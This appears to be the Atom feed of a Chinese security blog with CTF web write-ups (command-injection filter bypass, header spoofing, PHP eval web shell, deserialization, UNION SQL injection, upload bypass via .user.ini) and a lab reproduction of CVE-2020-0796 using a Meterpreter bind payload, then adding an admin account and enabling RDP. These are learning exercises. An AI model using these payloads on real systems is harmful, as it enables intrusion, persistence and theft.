<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>大周&#39;blog</title>
  
  <subtitle>ctf</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://lingxin16.github.io/"/>
  <updated>2020-06-17T15:17:32.918Z</updated>
  <id>http://lingxin16.github.io/</id>
  
  <author>
    <name>奝</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>GXYCTF2019-PingPingPing</title>
    <link href="http://lingxin16.github.io/2020/06/17/GXYCTF2019-PingPingPing/"/>
    <id>http://lingxin16.github.io/2020/06/17/GXYCTF2019-PingPingPing/</id>
    <published>2020-06-17T14:02:17.000Z</published>
    <updated>2020-06-17T15:17:32.918Z</updated>
    
    <content type="html"><![CDATA[<p>题目地址:<a href="https://buuoj.cn/" target="_blank" rel="noopener">buuctf</a></p><a id="more"></a><p>打开题目</p><p><img src="/2020/06/17/GXYCTF2019-PingPingPing/1.png" alt="1"></p><p>只有一个/?ip=</p><p>尝试传?ip=127.0.0.1，得到回显</p><p><img src="/2020/06/17/GXYCTF2019-PingPingPing/2.png" alt="2"></p><p>利用管道符漏洞，传?ip=127.0.0.1||ls</p><p><img src="/2020/06/17/GXYCTF2019-PingPingPing/3.png" alt="3"></p><p>看到flag.php 传?ip=127.0.0.1||cat%20flag.php</p><p><img src="/2020/06/17/GXYCTF2019-PingPingPing/4.png" alt="4"></p><p>尝试传一下，得知如果我们传入的字符含有flag空格或者/，那么就会返回错误</p><p>这里用$IFS$1来绕过空格的限制，传?ip=127.0.0.1||cat$IFS$1index.php</p><p><img src="/2020/06/17/GXYCTF2019-PingPingPing/5.png" alt="5"></p><p>可以看到确实过滤了很多</p><p>这里我用三种办法</p><h4 id="1-变量替换"><a href="#1-变量替换" class="headerlink" title="1.变量替换"></a>1.变量替换</h4><p><code>preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip</code></p><p>因为这个会判断输入语句中是否按顺序出现f l a g，所以我们用</p><p>?ip=127.0.0.1||a=g;cat$IFS$1fla$a.php</p><h4 id="2-内敛执行"><a href="#2-内敛执行" class="headerlink" title="2.内敛执行"></a>2.内敛执行</h4><pre><code>?ip=127.0.0.1||a=g;cat$IFS$1`ls`</code></pre><h4 id="3-sh"><a href="#3-sh" class="headerlink" title="3.sh"></a>3.sh</h4><p>既然过滤了bash，那么可以用sh</p><p>?ip=127.0.0.1||echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</p><p>其中Y2F0IGZsYWcucGhw是base64加密之后的cat flag.php</p><p>关于命令执行的绕过，可以参考ghtwf01师傅的这篇文章：<a href="https://www.ghtwf01.cn/index.php/archives/273/" target="_blank" rel="noopener">命令执行漏洞利用及绕过方式总结</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;题目地址:&lt;a href=&quot;https://buuoj.cn/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;buuctf&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="ctf" scheme="http://lingxin16.github.io/tags/ctf/"/>
    
      <category term="web" scheme="http://lingxin16.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>极客大挑战2019-Http</title>
    <link href="http://lingxin16.github.io/2020/06/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Http/"/>
    <id>http://lingxin16.github.io/2020/06/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Http/</id>
    <published>2020-06-13T14:06:42.000Z</published>
    <updated>2020-06-13T14:24:55.053Z</updated>
    
    <content type="html"><![CDATA[<p>题目地址:<a href="https://buuoj.cn/" target="_blank" rel="noopener">buuctf</a></p><a id="more"></a><p>打开题目</p><p><img src="/2020/06/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Http/1.png" alt="1"></p><p>主页并没有什么有用的信息，查看源文件，发现Secret.php</p><p><img src="/2020/06/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Http/2.png" alt="2"></p><p>打开</p><p><img src="/2020/06/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Http/3.png" alt="3"></p><p>提示It doesn’t come from ‘<a href="https://www.Sycsecret.com&#39;" target="_blank" rel="noopener">https://www.Sycsecret.com&#39;</a></p><p>那么就是http头伪造 利用burpsuit抓包修改 或者火狐编辑消息头</p><p>这里我用火狐 添加Referer:<a href="https://www.Sycsecret.com" target="_blank" rel="noopener">https://www.Sycsecret.com</a></p><p><img src="/2020/06/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Http/4.png" alt="4"></p><p>然后看到Please use “Syclover” browser</p><p><img src="/2020/06/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Http/5.png" alt="5"></p><p>那么再更改User-Agent: “Syclover” browser</p><p><img src="/2020/06/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Http/6.png" alt="6"></p><p>看到No!!! you can only read this locally!!!</p><p><img src="/2020/06/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Http/7.png" alt="7"></p><p>那么再修改X-Forwarded-For: 127.0.0.1</p><p><img src="/2020/06/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Http/8.png" alt="8"></p><p>得到flag</p><p><img src="/2020/06/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Http/9.png" alt="9"></p><p>上边的操作也可以用Python脚本实现</p><pre><code class="Python"># -*- coding: UTF-8 -*-import requestsurl=&quot;http://node3.buuoj.cn:29753/Secret.php&quot;headers={    &quot;Referer&quot;: &quot;https://www.Sycsecret.com&quot;,    &quot;Origin&quot;:&quot;https://www.Sycsecret.com&quot;,    &quot;User-Agent&quot;: &quot;Syclover&quot;,    &quot;X-Forwarded-For&quot;: &quot;127.0.0.1&quot;}r=requests.get(url=url,headers=headers)print(r.text)</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;题目地址:&lt;a href=&quot;https://buuoj.cn/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;buuctf&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="ctf" scheme="http://lingxin16.github.io/tags/ctf/"/>
    
      <category term="web" scheme="http://lingxin16.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>极客大挑战2019-Knife</title>
    <link href="http://lingxin16.github.io/2020/06/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Knife/"/>
    <id>http://lingxin16.github.io/2020/06/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Knife/</id>
    <published>2020-06-13T13:52:32.000Z</published>
    <updated>2020-06-13T13:58:54.746Z</updated>
    
    <content type="html"><![CDATA[<p>题目地址:<a href="https://buuoj.cn/" target="_blank" rel="noopener">buuctf</a></p><a id="more"></a><p>打开题目</p><p><img src="/2020/06/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Knife/1.png" alt="1"></p><p>上边有提示我家菜刀丢了，你能帮我找一下么</p><p>并且有<code>eval($_POST[&quot;Syc&quot;]);</code>说明连接密码是Syc</p><p>既然提示菜刀，那么我们用菜刀连接</p><p>这里我用蚁剑，测试连接成功</p><p><img src="/2020/06/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Knife/2.png" alt="2"></p><p>在根目录找到flag</p><p><img src="/2020/06/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Knife/3.png" alt="3"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;题目地址:&lt;a href=&quot;https://buuoj.cn/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;buuctf&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="ctf" scheme="http://lingxin16.github.io/tags/ctf/"/>
    
      <category term="web" scheme="http://lingxin16.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>极客大挑战2019-PHP</title>
    <link href="http://lingxin16.github.io/2020/06/12/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-PHP/"/>
    <id>http://lingxin16.github.io/2020/06/12/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-PHP/</id>
    <published>2020-06-12T13:58:03.000Z</published>
    <updated>2020-06-12T15:17:09.035Z</updated>
    
    <content type="html"><![CDATA[<p>题目地址:<a href="https://buuoj.cn/" target="_blank" rel="noopener">buuctf</a></p><a id="more"></a><p>打开题目</p><p><img src="/2020/06/12/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-PHP/1.png" alt="1"></p><p>描述中说有备份网站的习惯，尝试常见的网站备份地址，发现<a href="http://www.zip文件存在" target="_blank" rel="noopener">www.zip文件存在</a></p><p>下载解压，发现存在五个文件</p><p><img src="/2020/06/12/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-PHP/2.png" alt="2"></p><p>其中三个PHP文件代码分别为</p><p>index.php</p><pre><code class="php+HTML">&lt;!DOCTYPE html&gt;&lt;head&gt;  &lt;meta charset=&quot;UTF-8&quot;&gt;  &lt;title&gt;I have a cat!&lt;/title&gt;  &lt;link rel=&quot;stylesheet&quot; href=&quot;https://cdnjs.cloudflare.com/ajax/libs/meyer-reset/2.0/reset.min.css&quot;&gt;      &lt;link rel=&quot;stylesheet&quot; href=&quot;style.css&quot;&gt;&lt;/head&gt;&lt;style&gt;    #login{           position: absolute;           top: 50%;           left:50%;           margin: -150px 0 0 -150px;           width: 300px;           height: 300px;       }       h4{           font-size: 2em;           margin: 0.67em 0;       }&lt;/style&gt;&lt;body&gt;```index.php&lt;!DOCTYPE html&gt;&lt;head&gt;  &lt;meta charset=&quot;UTF-8&quot;&gt;  &lt;title&gt;I have a cat!&lt;/title&gt;  &lt;link rel=&quot;stylesheet&quot; href=&quot;https://cdnjs.cloudflare.com/ajax/libs/meyer-reset/2.0/reset.min.css&quot;&gt;      &lt;link rel=&quot;stylesheet&quot; href=&quot;style.css&quot;&gt;&lt;/head&gt;&lt;style&gt;    #login{           position: absolute;           top: 50%;           left:50%;           margin: -150px 0 0 -150px;           width: 300px;           height: 300px;       }       h4{           font-size: 2em;           margin: 0.67em 0;       }&lt;/style&gt;&lt;body&gt;&lt;div id=&quot;world&quot;&gt;    &lt;div style=&quot;text-shadow:0px 0px 5px;font-family:arial;color:black;font-size:20px;position: absolute;bottom: 85%;left: 440px;font-family:KaiTi;&quot;&gt;因为每次猫猫都在我键盘上乱跳，所以我有一个良好的备份网站的习惯    &lt;/div&gt;    &lt;div style=&quot;text-shadow:0px 0px 5px;font-family:arial;color:black;font-size:20px;position: absolute;bottom: 80%;left: 700px;font-family:KaiTi;&quot;&gt;不愧是我！！！    &lt;/div&gt;    &lt;div style=&quot;text-shadow:0px 0px 5px;font-family:arial;color:black;font-size:20px;position: absolute;bottom: 70%;left: 640px;font-family:KaiTi;&quot;&gt;    &lt;?php    include &#39;class.php&#39;;    $select = $_GET[&#39;select&#39;];    $res=unserialize(@$select);    ?&gt;    &lt;/div&gt;    &lt;div style=&quot;position: absolute;bottom: 5%;width: 99%;&quot;&gt;&lt;p align=&quot;center&quot; style=&quot;font:italic 15px Georgia,serif;color:white;&quot;&gt; Syclover @ cl4y&lt;/p&gt;&lt;/div&gt;&lt;/div&gt;&lt;script src=&#39;http://cdnjs.cloudflare.com/ajax/libs/three.js/r70/three.min.js&#39;&gt;&lt;/script&gt;&lt;script src=&#39;http://cdnjs.cloudflare.com/ajax/libs/gsap/1.16.1/TweenMax.min.js&#39;&gt;&lt;/script&gt;&lt;script src=&#39;https://s3-us-west-2.amazonaws.com/s.cdpn.io/264161/OrbitControls.js&#39;&gt;&lt;/script&gt;&lt;script src=&#39;https://s3-us-west-2.amazonaws.com/s.cdpn.io/264161/Cat.js&#39;&gt;&lt;/script&gt;&lt;script  src=&quot;index.js&quot;&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>class.php</p><pre><code class="PHP">&lt;?phpinclude &#39;flag.php&#39;;error_reporting(0);class Name{    private $username = &#39;nonono&#39;;    private $password = &#39;yesyes&#39;;    public function __construct($username,$password){        $this-&gt;username = $username;        $this-&gt;password = $password;    }    function __wakeup(){        $this-&gt;username = &#39;guest&#39;;    }    function __destruct(){        if ($this-&gt;password != 100) {            echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;;            echo &quot;You name is: &quot;;            echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;;            echo &quot;You password is: &quot;;            echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;;            die();        }        if ($this-&gt;username === &#39;admin&#39;) {            global $flag;            echo $flag;        }else{            echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#39;t give you the flag!&quot;;            die();        }    }}?&gt;</code></pre><p>flag.php</p><pre><code class="php">&lt;?php$flag = &#39;Syc{dog_dog_dog_dog}&#39;;?&gt;</code></pre><p>可以看到在index.php中包含了class.php 代码如下</p><pre><code class="PHP">&lt;?php    include &#39;class.php&#39;;    $select = $_GET[&#39;select&#39;];    $res=unserialize(@$select);    ?&gt;</code></pre><p>从这几行代码中，推断与反序列化有关</p><p>然后看class.php几个关键函数</p><pre><code>__construct构造函数__wakeup函数__destruct析构函数</code></pre><p>关于__wakeup函数的漏洞，参考<a href>wakeup()函数漏洞以及实际漏洞分析</a></p><p><code>__wakeup()</code>漏洞，简要来说就是当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过<code>__wakeup()</code>的执行</p><p>这里我们需要构造username等于admin和password等于100来echo flag</p><pre><code class="PHP">&lt;?phpclass Name{    private $username = &#39;admin&#39;;    private $password = &#39;100&#39;;}$a = new Name();echo serialize($a);?&gt;</code></pre><p>得到O:4:”Name”:2:{s:14:”Nameusername”;s:5:”admin”;s:14:”Namepassword”;s:3:”100”;}</p><p>为了绕过<code>__wakeup()</code> 我们将2改为3</p><p>得到O:4:”Name”:3:{s:14:”Nameusername”;s:5:”admin”;s:14:”Namepassword”;s:3:”100”;}</p><p>然后关于private声明变量</p><p>private 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。因此私有字段的字段名在序列化时，类名和字段名前面都会加上\0的前缀。字符串长度也包括所加前缀的长度。其中 \0 字符也是计算长度的。</p><p>因此我们在类名和字段名前面加上\0的前缀，而\0 在url栏中会出现空白符，复制的时候丢失，所以我们加上%00</p><p>最后得到payload</p><pre><code>?select=O:4:&quot;Name&quot;:3:{s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;s:3:&quot;100&quot;;}</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;题目地址:&lt;a href=&quot;https://buuoj.cn/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;buuctf&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="ctf" scheme="http://lingxin16.github.io/tags/ctf/"/>
    
      <category term="web" scheme="http://lingxin16.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>极客大挑战2019-LoveSQL</title>
    <link href="http://lingxin16.github.io/2020/06/11/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-LoveSQL/"/>
    <id>http://lingxin16.github.io/2020/06/11/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-LoveSQL/</id>
    <published>2020-06-11T13:56:16.000Z</published>
    <updated>2020-06-11T14:38:55.698Z</updated>
    
    <content type="html"><![CDATA[<p>题目地址:<a href="https://buuoj.cn/" target="_blank" rel="noopener">buuctf</a></p><a id="more"></a><p>打开题目  熟悉的界面</p><p><img src="/2020/06/11/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-LoveSQL/1.png" alt="1"></p><p>有一行红字用 sqlmap 是没有灵魂的 用sqlmap跑一下，但是失败了</p><p>还是手动吧   用万能密码登录得到</p><p><img src="/2020/06/11/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-LoveSQL/2.png" alt="2"></p><p>登陆成功，并提示密码，密码尝试用md5爆破无果</p><p>然后就是普通的sql注入了..</p><p>username=1’order by 1#</p><p><img src="/2020/06/11/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-LoveSQL/3.png" alt="3"></p><p><img src="/2020/06/11/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-LoveSQL/4.png" alt="4"></p><p>username=1’order by 4#的时候出现Unknown column ‘4’ in ‘order clause’</p><p>说明总共有三个字段</p><p>username=1’union select 1,2,3 #</p><p><img src="/2020/06/11/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-LoveSQL/5.png" alt="5"></p><p>得到回显点2和3</p><p>username=1’union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()#</p><p><img src="/2020/06/11/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-LoveSQL/6.png" alt="6"></p><p>得到两个表geekuser和l0ve1ysq1</p><p>username=1’union select 1,group_concat(column_name),3 from information_schema.columns where table_name=’geekuser’#</p><p><img src="/2020/06/11/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-LoveSQL/7.png" alt="7"></p><p>得到三个字段id，username和password</p><p>爆破这三个字段</p><p>username=1’union select 1,group_concat(id,username,password),3 from geekuser#</p><p><img src="/2020/06/11/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-LoveSQL/8.png" alt="8"></p><p>没有flag</p><p>接下来换l0ve1ysq1表 </p><p>username=1’union select 1,group_concat(column_name),3 from information_schema.columns where table_name=’l0ve1ysq1’#</p><p>得到一样的三个字段 </p><p><img src="/2020/06/11/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-LoveSQL/9.png" alt="9"></p><p>爆破这三个字段</p><p>1’union select 1,group_concat(id,username,password),3 from l0ve1ysq1#</p><p>得到flag</p><p><img src="/2020/06/11/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-LoveSQL/10.png" alt="10"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;题目地址:&lt;a href=&quot;https://buuoj.cn/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;buuctf&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="ctf" scheme="http://lingxin16.github.io/tags/ctf/"/>
    
      <category term="web" scheme="http://lingxin16.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2020-0796复现</title>
    <link href="http://lingxin16.github.io/2020/06/08/CVE-2020-0796%E5%A4%8D%E7%8E%B0/"/>
    <id>http://lingxin16.github.io/2020/06/08/CVE-2020-0796%E5%A4%8D%E7%8E%B0/</id>
    <published>2020-06-08T06:06:29.000Z</published>
    <updated>2020-06-08T09:42:40.468Z</updated>
    
    <content type="html"><![CDATA[<p>最近发布的一个Windows漏洞，有时间来复现一下</p><a id="more"></a><h3 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h3><p>有关此漏洞的详细介绍:<a href="https://www.freebuf.com/vuls/233263.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/233263.html</a></p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>利用Windows10 1903版本来进行复现 </p><h4 id="镜像下载与安装"><a href="#镜像下载与安装" class="headerlink" title="镜像下载与安装"></a>镜像下载与安装</h4><pre><code>镜像：ed2k://|file|cn_windows_10_business_editions_version_1903_x64_dvd_e001dd2c.iso|4815527936|47D4C57E638DF8BF74C59261E2CE702D|</code></pre><p>安装镜像</p><p><img src="/2020/06/08/CVE-2020-0796%E5%A4%8D%E7%8E%B0/1.png" alt="1"></p><h4 id="虚拟机信息"><a href="#虚拟机信息" class="headerlink" title="虚拟机信息"></a>虚拟机信息</h4><p>Windows10 1903版本</p><p>ip：192.168.1.104</p><h4 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h4><p>攻击机</p><p>工具：SMBGhost</p><pre><code>python3 scanner.py 192.168.1.104</code></pre><p><img src="/2020/06/08/CVE-2020-0796%E5%A4%8D%E7%8E%B0/2.png" alt="2"></p><p>靶机</p><p>工具：奇安信检测工具</p><p><img src="/2020/06/08/CVE-2020-0796%E5%A4%8D%E7%8E%B0/3.png" alt="3"></p><h4 id="使用metasploit生成buf"><a href="#使用metasploit生成buf" class="headerlink" title="使用metasploit生成buf"></a>使用metasploit生成buf</h4><pre><code>msfvenom -p windows/x64/meterpreter/bind_tcp lport=6666 -f py -o tool.py </code></pre><p><img src="/2020/06/08/CVE-2020-0796%E5%A4%8D%E7%8E%B0/4.png" alt="4"></p><p>将SMBGhost_RCE_PoC中的exploit.py中的USER_OAYLOAD更换为刚刚生成的buf</p><p><img src="/2020/06/08/CVE-2020-0796%E5%A4%8D%E7%8E%B0/5.png" alt="5"></p><h4 id="使用metasploit对6666端口进行监听"><a href="#使用metasploit对6666端口进行监听" class="headerlink" title="使用metasploit对6666端口进行监听"></a>使用metasploit对6666端口进行监听</h4><pre><code>msfconsoleuse exploit/multi/handlerset payload windows/x64/meterpreter/bind_tcpshow optionsset LPORT 6666set RHOST 192.168.1.104exploit</code></pre><p><img src="/2020/06/08/CVE-2020-0796%E5%A4%8D%E7%8E%B0/6.png" alt="6"></p><h4 id="运行exploit-py"><a href="#运行exploit-py" class="headerlink" title="运行exploit.py"></a>运行exploit.py</h4><pre><code>python3 exploit.py -ip 192.168.1.104</code></pre><p><img src="/2020/06/08/CVE-2020-0796%E5%A4%8D%E7%8E%B0/7.png" alt="7"></p><p>这里打下去靶机会出现蓝屏重启的现象，多试几次就好</p><p><img src="/2020/06/08/CVE-2020-0796%E5%A4%8D%E7%8E%B0/8.png" alt="8"></p><p>拿到shell</p><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><h4 id="添加用户"><a href="#添加用户" class="headerlink" title="添加用户"></a>添加用户</h4><pre><code>net user d1a0 password /add</code></pre><h4 id="加入管理组"><a href="#加入管理组" class="headerlink" title="加入管理组"></a>加入管理组</h4><pre><code>net localgroup Administrators d1a0 /addnet localgroup Users d1a0 /del</code></pre><h4 id="查看用户信息"><a href="#查看用户信息" class="headerlink" title="查看用户信息"></a>查看用户信息</h4><pre><code>net user</code></pre><p><img src="/2020/06/08/CVE-2020-0796%E5%A4%8D%E7%8E%B0/9.png" alt="9"></p><h4 id="开启远程连接功能"><a href="#开启远程连接功能" class="headerlink" title="开启远程连接功能"></a>开启远程连接功能</h4><pre><code>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</code></pre><p><img src="/2020/06/08/CVE-2020-0796%E5%A4%8D%E7%8E%B0/10.png" alt="10"></p><p><img src="/2020/06/08/CVE-2020-0796%E5%A4%8D%E7%8E%B0/11.png" alt="11"></p><p><img src="/2020/06/08/CVE-2020-0796%E5%A4%8D%E7%8E%B0/12.png" alt="12"></p><p>工具地址：</p><p>SMBGhost：<a href="https://github.com/ollypwn/SMBGhost" target="_blank" rel="noopener">https://github.com/ollypwn/SMBGhost</a></p><p>奇安信检测工具：<a href="http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip" target="_blank" rel="noopener">http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip</a></p><p>SMBGhost_RCE_PoC：<a href="https://github.com/chompie1337/SMBGhost_RCE_PoC.git" target="_blank" rel="noopener">https://github.com/chompie1337/SMBGhost_RCE_PoC.git</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近发布的一个Windows漏洞，有时间来复现一下&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>计算机网络原理学习</title>
    <link href="http://lingxin16.github.io/2020/06/07/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0/"/>
    <id>http://lingxin16.github.io/2020/06/07/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0/</id>
    <published>2020-06-07T03:32:24.000Z</published>
    <updated>2020-06-07T04:04:46.662Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><h3 id="OSI和TCP-IP网络模型"><a href="#OSI和TCP-IP网络模型" class="headerlink" title="OSI和TCP.IP网络模型"></a>OSI和TCP.IP网络模型</h3><p>OSI网络模型(参考模型) 分为七层</p><p>应用层                         用户接口                                                                                                                    HTTP Telnet</p><p>表示层                         数据的表现形式、特定功能的实现例如加密                                                          ASCll、ENCDIC 、JPEG   </p><p>会话层                         对应用会话的管理、同步                                                                                         操作系统、应用读取</p><p>传输层                         可靠与不可靠的传输、传输前的错误检测、流控                                                  TCP(可靠)/UDP(不可靠)</p><p>网络层                         提供逻辑地址、选路                                                                                                 IP</p><p>数据链路层                 成帧、用Mac地址访问媒介、错误检测与修正                                                       802.3/802.2       HDLC/FR/PPP</p><p>物理层                         设备之间的比特流传输、物理接口、电气特性等                                                   EIA/TIA-232            V.35/RJ45</p><p>TCP/IP协议栈</p><p>应用层</p><p>传输层</p><p>网络层</p><p>网络接口层</p><p>对比</p><p><img src="/2020/06/07/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0/1.png" alt="1"></p><h3 id="网络设备"><a href="#网络设备" class="headerlink" title="网络设备"></a>网络设备</h3><p>路由器 、交换机、防火墙(硬件)等</p><h3 id="以太网"><a href="#以太网" class="headerlink" title="以太网"></a>以太网</h3><p>双绞线制作的两种标准以及线序</p><p>EIA/TIA 568A             绿白   绿  橙白   蓝   蓝白   橙   棕白   棕</p><p>EIA/TIA 568B             橙白   橙  绿白   蓝   蓝白   绿   棕白   棕</p><p>标准以太网(10Mbit/s)  由IEEE802.3定义   通常只定位在网络的接入层</p><p>快速以太网(100Mbit/s)   IEEE802.3u标准</p><p>千兆以太网   对IEEE802.3以太网标准的扩展   两个标准(IEEE802.3z光纤羽铜缆、IEEE82.3AB双绞线)</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;a id=&quot;more&quot;&gt;&lt;/a&gt;

&lt;h3 id=&quot;OSI和TCP-IP网络模型&quot;&gt;&lt;a href=&quot;#OSI和TCP-IP网络模型&quot; class=&quot;headerlink&quot; title=&quot;OSI和TCP.IP网络模型&quot;&gt;&lt;/a&gt;OSI和TCP.IP网络模型&lt;/h3&gt;&lt;p&gt;OSI
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>SUCTF2019-CheckIn</title>
    <link href="http://lingxin16.github.io/2020/06/01/SUCTF2019-CheckIn/"/>
    <id>http://lingxin16.github.io/2020/06/01/SUCTF2019-CheckIn/</id>
    <published>2020-06-01T04:21:20.000Z</published>
    <updated>2020-06-01T06:38:20.811Z</updated>
    
    <content type="html"><![CDATA[<p>题目地址：<a href="https://buuoj.cn/" target="_blank" rel="noopener">buuctf</a></p><a id="more"></a><p>打开题目，发现是个文件上传类型的题目</p><p><img src="/2020/06/01/SUCTF2019-CheckIn/1.png" alt="1"></p><p>上传一句话木马尝试</p><p><img src="/2020/06/01/SUCTF2019-CheckIn/2.png" alt="2"></p><p>提示非法后缀 再次用png图片尝试</p><p><img src="/2020/06/01/SUCTF2019-CheckIn/3.png" alt="3"></p><p>提示上传文件中包含?</p><p>当上传其他类型的文件时(txt、html等)提示不是图片文件</p><p><img src="/2020/06/01/SUCTF2019-CheckIn/4.png" alt="4"></p><p>关于exif_imagetype我们百度一下</p><p><img src="/2020/06/01/SUCTF2019-CheckIn/5.png" alt="5"></p><p>exif_imagetype() 读取一个图像的第一个字节并检查其签名。说明我们可以在文件头部添加jpg类型图片的标志（FF D8 FF）来绕过并且用JavaScript语句写一句话来绕过对问号过滤</p><p><img src="/2020/06/01/SUCTF2019-CheckIn/6.png" alt="6"></p><p>接下来上传 上传成功</p><p><img src="/2020/06/01/SUCTF2019-CheckIn/7.png" alt="7"></p><p>但是当我们连接的时候发现并没有解析成功</p><p>这里我们用.user.ini来将jpg格式解析成php格式</p><p>关于.user.ini这里有一篇文章 <a href="https://wooyun.js.org/drops/user.ini文件构成的PHP后门.html" target="_blank" rel="noopener">user.ini文件构成的PHP后门</a></p><p>这是我写的一个.user.ini文件</p><p><img src="/2020/06/01/SUCTF2019-CheckIn/8.png" alt="8"></p><p>先把这个.user.ini文件上传 然后上传1.jpg</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;题目地址：&lt;a href=&quot;https://buuoj.cn/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;buuctf&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="ctf" scheme="http://lingxin16.github.io/tags/ctf/"/>
    
      <category term="web" scheme="http://lingxin16.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
